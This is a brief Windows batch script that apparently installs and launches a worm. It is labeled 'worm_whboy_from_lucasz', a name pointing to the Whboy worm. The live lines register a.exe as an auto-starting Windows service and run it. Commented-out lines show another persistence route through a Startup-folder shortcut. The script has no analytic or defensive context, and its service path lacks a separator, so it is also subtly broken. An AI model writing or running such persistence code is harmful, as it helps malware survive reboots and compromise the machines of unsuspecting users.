@REM @echo off
@REM echo Set oWS = WScript.CreateObject("WScript.Shell") >> CreateShortcut.vbs
@REM echo sLinkFile = "%CD%\a.lnk" >> CreateShortcut.vbs
@REM echo Set oLink = oWS.CreateShortcut(sLinkFile) >> CreateShortcut.vbs
@REM echo oLink.TargetPath = "%CD%\a.exe" >> CreateShortcut.vbs
@REM echo oLink.Save >> CreateShortcut.vbs
@REM cscript CreateShortcut.vbs
@REM del CreateShortcut.vbs
@REM copy %CD%\a C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

sc create worm_whboy_from_lucasz binPath= %CD%a.exe start= auto
a